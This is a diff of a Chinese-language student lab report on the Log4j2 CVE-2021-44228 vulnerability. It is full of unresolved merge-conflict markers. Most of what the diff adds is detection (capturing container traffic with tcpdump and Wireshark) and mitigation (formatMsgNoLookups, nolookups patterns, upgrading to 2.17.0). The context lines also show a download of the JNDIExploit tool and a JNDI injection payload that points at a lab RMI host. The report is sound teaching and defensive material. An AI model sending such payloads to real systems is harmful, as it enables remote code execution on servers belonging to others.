@@ -18,7 +18,11 @@ Ani
     - [验证漏洞可利用性](#验证漏洞可利用性)
     - [漏洞利用效果](#漏洞利用效果)
         - [使用 JNDIExploit 工具](#使用-jndiexploit-工具)
+<<<<<<< HEAD
     - [漏洞利用防御与加固](#漏洞利用防御与加固) 
+=======
+    - [漏洞利用缓解与修复](#漏洞利用缓解与修复) 
+>>>>>>> ceea5a9 (update)
         - [漏洞利用防御与加固](#漏洞利用防御与加固)
 - [参考资料](#参考资料)
 
@@ -26,8 +30,17 @@ Ani
 
 ### 负责工作
 
+<<<<<<< HEAD
 - 作为红队完成对漏洞的存在性检验以及实现漏洞利用
 - 作为蓝队完成漏洞利用的缓解
+=======
+- Log4j2 CVE-2021-44228
+  - 漏洞存在性检验
+  - 漏洞可利用性
+  - 漏洞利用效果
+  - 漏洞利用检验
+  - 漏洞利用缓解与修复
+>>>>>>> ceea5a9 (update)
 
 ### 实验目的
 
@@ -61,6 +74,11 @@ Ani
 
 `Burpsuite`
 
+<<<<<<< HEAD
+=======
+`Wireshark`
+
+>>>>>>> ceea5a9 (update)
 ### 实验过程
 
 #### 从零开始搭建基础虚拟机环境
@@ -506,7 +524,11 @@ wget https://hub.fastgit.org/Mr-xn/JNDIExploit-1/releases/download/v1.2/JNDIExpl
 新安装了 `Extension` 拓展包并打开系统隐私权限也无法拖拽，于是曲线救国使用 `ssh` 将文件远程传入虚拟机
 
 ```bash
+<<<<<<< HEAD
 scp 
+=======
+scp JNDIExploit.v1.2.zip kali@192.168.58.3:./
+>>>>>>> ceea5a9 (update)
 ```
 
 ![scp](img/scpzip.png)
@@ -572,7 +594,137 @@ ${jndi:rmi://192.168.56.3:1099/prj2oz}
 
 ![tongguo](img/tongguo.png)
 
+<<<<<<< HEAD
 #### 漏洞利用缓解
+=======
+#### 漏洞利用检测
+
+使用 `Docker` 的网络命名空间和网络抓包工具来捕获和分析流量
+
+```bash
+docker ps
+```
+
+![dockerps](img/ps1.png)
+
+查看容器网络命名
+
+```bash
+docker inspect -f '{{.State.Pid}}' 5a70f12a4f37
+```
+
+![webname](img/webname.png)
+
+进入容器的网络命名空间并将在 `eth0` 网络接口上捕获的流量保存为 `captured.pcap`
+
+```bash
+nsenter -t 81738 -n
+tcpdump -i eth0 -w captured.pcap
+```
+
+![pcap](img/pcap.png)
+
+将文件用 `Wireshark` 打开分析
+
+![pcap1](img/pcap1.png)
+
+可以看到有疑似远程代码执行的攻击流量
+
+#### 漏洞利用缓解与修复
+
+缓解与修复方案：
+
+- 升级 `JDK`
+
+- 修改 `Log4j2` 配置
+
+  - 当 `log4j2` 版本 >= 2.10 的情况使用如下缓解措施
+
+    - 环境变量中增加如下配置：
+
+    ```
+    LOG4J_log4j2.formatMsgNoLookups=true
+    ```
+    - 项目 `classpath` 下新建配置文件 `log4j2.component.properties`，内容如下：
+
+    ```
+    log4j2.formatMsgNoLookups=true
+    ```
+    - 添加 `jvm` 启动加载参数 
+    ```
+    Dlog4j2.formatMsgNoLookups=true
+    ``` 
+  - 当 `log4j2` 版本 < 2.10 的情况使用如下缓解措施在项目 `src` 目录中的配置文件 `log4j2.xml` 中，修改 `PatternLayout` 的值
+  ```xml
+  <PatternLayout pattern="%d{HH:mm:ss.SSS} [%t] %-5level %logger{36} - %msg{nolookups}%n"/>
+  或
+  <PatternLayout pattern="%d{HH:mm:ss.SSS} [%t] %-5level %logger{36} - %m{nolookups}%n"/>
+  ```
+
+  完整文件：
+  ```xml
+  <?xml version="1.0" encoding="UTF-8"?>
+  <Configuration status="WARN">
+      <Appenders>
+          <!-- 默认打印到控制台 -->
+          <Console name="Console" target="SYSTEM_OUT">
+              <!-- 关键内容 -->
+              <PatternLayout pattern="%d{HH:mm:ss.SSS} [%t] %-5level %logger{36} - %msg{nolookups}%n"/>
+         </Console>
+      </Appenders>
+      <Loggers>
+          <!-- 默认打印日志级别为 error -->
+          <Root level="error">
+              <AppenderRef ref="Console"/>
+         </Root>
+      </Loggers>
+    </Configuration>
+  ```
+
+- 将项目依赖的 `Log4j2` 升级到最新版本
+
+  当项目对于 `Log4j2` 有强依赖时，在项目主 `pom.xml` 中引入 `Log4j2` 的最新版本进行版本覆盖：
+
+  ```xml
+  <dependencies>
+	        <dependency>
+                <groupId>org.apache.logging.log4j</groupId>
+                <artifactId>log4j-api</artifactId>
+                <version>2.17.0</version>
+            </dependency>
+            <dependency>
+                <groupId>org.apache.logging.log4j</groupId>
+                <artifactId>log4j-core</artifactId>
+                <version>2.17.0</version>
+            </dependency>
+            <dependency>
+                <groupId>org.apache.logging.log4j</groupId>
+                <artifactId>log4j-to-slf4j</artifactId>
+                <version>2.17.0</version>
+            </dependency>
+  </dependencies>
+  ```
+
+- 将项目中的 `Log4j2` 依赖排除
+
+  当项目对于 `Log4j2` 没有强依赖时，利用` Maven Helper` 插件搜索出，依赖关系，在引入依赖的节点直接将 `Log4j2` 的引入排除掉
+
+  ```xml
+  <dependency>
+      <groupId>org.springframework.boot</groupId>
+      <artifactId>spring-boot-starter-jdbc</artifactId>
+        <exclusions>
+            <exclusion>
+               <groupId>org.apache.logging.log4j</groupId>
+                <artifactId>log4j-to-slf4j</artifactId>
+            </exclusion>
+        </exclusions>
+  </dependency>
+  ```
+
+- 第三方应用服务修复
+  - 此次漏洞受影响的范围还是非常广泛的，包括一些常用的中间件、数据库。这些第三方的应用服务，短时间内在官方没有发布安全版本的情况下，只能临时通过替换应用目录中的 `jar` 文件的方式进行修复；可以去官方的 `snapshot` 库下载最新的 `jar` 文件，对第三方服务进行替换操作；(注意做好文件备份工作，有的服务可能会出现启动失败的情况)
+>>>>>>> ceea5a9 (update)
 
 ##### 漏洞利用防御与加固
 
@@ -582,6 +734,10 @@ ${jndi:rmi://192.168.56.3:1099/prj2oz}
 
 
 
+<<<<<<< HEAD
+=======
+
+>>>>>>> ceea5a9 (update)
 ### 参考资料
 
 [网络安全 2021 综合实验](https://www.bilibili.com/video/BV1p3411x7da?p=4&spm_id_from=pageDriver&vd_source=c77148c25420ef65a1b98a765a8e118c)
@@ -598,5 +754,13 @@ ${jndi:rmi://192.168.56.3:1099/prj2oz}
 
 [bash_dev_tcp 介绍](https://becivells.github.io/2019/01/bash_i_dev_tcp/)
 
+<<<<<<< HEAD
+=======
+[log4j2 漏洞缓解](https://zhuanlan.zhihu.com/p/444329520#:~:text=Apache%20log4j2%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%20%28JNDI%E6%B3%A8%E5%85%A5%29%E6%BC%8F%E6%B4%9E%E4%BF%AE%E5%A4%8D%E5%92%8C%E5%BD%B1%E5%93%8D%E7%BC%93%E8%A7%A3%201%200x01%20%E7%BC%93%E8%A7%A3%E6%8E%AA%E6%96%BD%202%20log4j2%E7%89%88%E6%9C%AC%3E%3D2.10%E7%9A%84%E6%83%85%E5%86%B5%E4%BD%BF%E7%94%A8%E5%A6%82%E4%B8%8B%E7%BC%93%E8%A7%A3%E6%8E%AA%E6%96%BD%EF%BC%9A,4%20Log4j2%202.15.0%20jar%E5%8C%85%E4%B8%8B%E8%BD%BD%EF%BC%9A%20%E6%9C%80%E5%90%8E%20%E6%9C%89%E9%81%93%E4%BA%91%E7%AC%94%E8%AE%B0%20%E6%9C%80%E5%90%8E%20)
+
+[Log4j2漏洞修复](https://blog.csdn.net/derstsea/article/details/121918902)
+
+[Wireshark 网络数据包角度看log4j](https://blog.csdn.net/weixin_47627078/article/details/122251204)
+>>>>>>> ceea5a9 (update)
 ---
 
